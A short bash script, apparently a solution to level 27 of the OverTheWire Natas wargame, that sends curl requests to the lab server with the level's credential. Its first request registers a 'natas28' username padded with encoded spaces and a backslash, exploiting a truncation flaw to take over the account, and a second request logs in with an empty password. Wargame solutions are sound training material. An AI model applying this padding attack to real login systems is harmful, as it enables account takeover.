#!/bin/bash



curl -u "natas27:u3RRffXjysjgwFU6b9xa23i6prmUsYne" \
	-H "Cookie: PHPSESSID=damn" \
	-v \
  -X POST "http://natas27.natas.labs.overthewire.org/" \
	-d "username=natas28%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%5c" \
	-d "password=$1" \
	-c - \
	| batcat -l html 
 
sleep 1 

curl -u "natas27:u3RRffXjysjgwFU6b9xa23i6prmUsYne" \
  -v \
	-H "Cookie: PHPSESSID=" \
	"http://natas27.natas.labs.overthewire.org/" \
  -d "username=natas28" \
  -d "password=" \
	-c - \
  | batcat -l html 
 

#natas28%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20    %20%20%2
# $(
